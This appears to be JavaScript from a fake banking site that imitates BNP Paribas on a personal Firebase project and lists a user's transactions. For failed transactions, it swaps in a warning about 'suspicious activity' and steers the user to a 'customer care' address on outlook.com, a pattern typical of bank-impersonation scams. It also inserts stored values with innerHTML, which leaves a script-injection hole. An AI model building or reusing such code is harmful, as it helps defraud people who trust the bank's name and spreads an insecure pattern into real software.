import { initializeApp } from "https://www.gstatic.com/firebasejs/10.11.1/firebase-app.js";
import {
  getAuth,
  onAuthStateChanged,
} from "https://www.gstatic.com/firebasejs/10.11.1/firebase-auth.js";
import {
  getFirestore,
  doc,
  getDoc,
  updateDoc,
} from "https://www.gstatic.com/firebasejs/10.11.1/firebase-firestore.js";
// Initialize Firebase
const firebaseConfig = {
  apiKey: "AIzaSyBF8ZzvxHc04fhiXIJo7IPo9GhfQ_GdKaU",
  authDomain: "bnp-paribas-4788a.firebaseapp.com",
  projectId: "bnp-paribas-4788a",
  storageBucket: "bnp-paribas-4788a.firebasestorage.app",
  messagingSenderId: "94200813028",
  appId: "1:94200813028:web:ad5f9fb97fbb625fde23f1",
  measurementId: "G-7R5LVHLTE5",
};

// Initialize Firebase
const app = initializeApp(firebaseConfig);

//auth and firestore references
const auth = getAuth();
const db = getFirestore(app);

onAuthStateChanged(auth, async (user) => {
  const userDocRef = doc(db, "Users", user.email);
  const userDocSnap = await getDoc(userDocRef);
  const transactionDocRef = doc(db, "Transactions", user.email);
  const transactionDocSnap = await getDoc(transactionDocRef);

  if (transactionDocSnap.exists()) {
    if (transactionDocSnap.data().Transaction != undefined) {
      transactionDocSnap
        .data()
        .Transaction.reverse()
        .map((item) => {
          console.log(transactionDocSnap.data().Transaction);

          const parentTable = document.getElementById("parentTable");
          const row = document.createElement("tr");
          const dateHead = document.createElement("th");
          dateHead.setAttribute("scope", "row");
          const accountHead = document.createElement("th");
          accountHead.setAttribute("scope", "row");
          const beneficiaryHead = document.createElement("th");
          beneficiaryHead.setAttribute("scope", "row");
          const amountHead = document.createElement("th");
          amountHead.setAttribute("scope", "row");
          const statusHead = document.createElement("th");
          statusHead.setAttribute("scope", "row");

          const date = document.createElement("td");
          date.innerHTML = item.date;
          const account = document.createElement("td");
          account.innerHTML = item.account;
          const beneficiary = document.createElement("td");
          beneficiary.innerHTML = item.name;
          const amount = document.createElement("td");
          amount.innerHTML = item.amount;
          const status = document.createElement("td");
          status.innerHTML = item.status;
          if (status.innerHTML == "Pending") {
            status.style.color = "orange";
          } else if (status.innerHTML == "Successful") {
            status.style.color = "lightgreen";
          } else if (status.innerHTML == "Failed") {
            status.innerHTML =
              "Failed (We Have Detected A Suspicious Activity Going On In Your Account Please Contact Customer Care At: Bnpparibascustomercare@outlook.com)";
            status.style.color = "red";
          }

          dateHead.appendChild(date);
          accountHead.appendChild(account);
          beneficiaryHead.appendChild(beneficiary);
          amountHead.appendChild(amount);
          statusHead.appendChild(status);

          row.appendChild(dateHead);
          row.appendChild(accountHead);
          row.appendChild(beneficiaryHead);
          row.appendChild(amountHead);
          row.appendChild(statusHead);
          parentTable.appendChild(row);
        });
    }
  }
});
